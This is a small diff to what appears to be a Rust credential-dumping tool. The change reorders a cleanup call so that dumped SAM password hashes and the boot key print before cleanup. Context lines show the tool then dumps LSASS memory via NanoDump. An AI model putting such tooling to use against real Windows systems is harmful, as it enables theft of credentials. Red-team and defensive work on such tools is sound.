@@ -809,9 +809,7 @@ pub async fn secrets_dump_nanodump(
         .await
         .map_err(|e| format!("SAM dump: {e}"))?;
 
-    handle.finish(&session, ipc, &cred).await;
-
-    // Print SAM results (same format as secrets_dump)
+    // Print SAM results BEFORE cleanup so "[*] Cleaning up..." stays at the end.
     println!(
         "[*] Target system bootKey: 0x{}",
         sam_result
@@ -824,6 +822,8 @@ pub async fn secrets_dump_nanodump(
     for h in &sam_result.hashes {
         println!("{h}");
     }
+
+    handle.finish(&session, ipc, &cred).await;
 
     // ── 2. LSASS minidump via NanoDump ────────────────────────────────────
     println!("[*] Dumping LSASS via NanoDump (--{technique})");
